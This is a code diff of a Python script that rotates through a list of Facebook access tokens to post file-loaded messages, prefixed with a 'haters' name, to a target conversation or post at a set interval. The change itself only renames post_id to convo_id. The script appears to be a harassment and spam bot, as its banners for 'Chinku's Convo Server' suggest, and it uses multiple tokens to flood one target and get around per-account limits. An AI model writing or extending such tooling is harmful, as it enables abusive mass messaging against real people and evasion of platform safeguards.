@@ -114,7 +114,7 @@ def send_initial_message():
         for token in tokens:
             access_token = token.strip()
             url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
-            msg = msg_template.format(post_id, haters_name, access_token)
+            msg = msg_template.format(convo_id, haters_name, access_token)
             parameters = {'access_token': access_token, 'message': msg}
             response = requests.post(url, json=parameters, headers=headers)
             time.sleep(0.1)
@@ -130,17 +130,17 @@ def send_messages_from_file():
                 token_index = message_index % max_tokens
                 access_token = tokens[token_index].strip()
                 message = messages[message_index].strip()
-                url = "https://graph.facebook.com/v17.0/{}/comments".format(post_id)
+                url = "https://graph.facebook.com/v17.0/{}/comments".format(convo_id)
                 parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
                 response = requests.post(url, json=parameters, headers=headers)
                 if response.ok:
                     print("\033[1;36m[✓] Your Massage Successfully Sent By Chinku's Convo Server No. {} of Post {} Token {}: {}".format(
-                        message_index + 1, post_id, token_index + 1, haters_name + ' ' + message))
+                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                     print(formatted_time)
                     print('\033[1;92m' + '✪✭═══════•『 Chinku xD 』•═══════✭✪')
                 else:
                     print("\033[1;35m[x] Failed to send Message {} of Post {} with Token {}: {}".format(
-                        message_index + 1, post_id, token_index + 1, haters_name + ' ' + message))
+                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                     print(formatted_time)
                     print('\033[1;92m' + '✪✭═══════•『 Chinku xD 』•═══════✭✪')
                 time.sleep(speed)
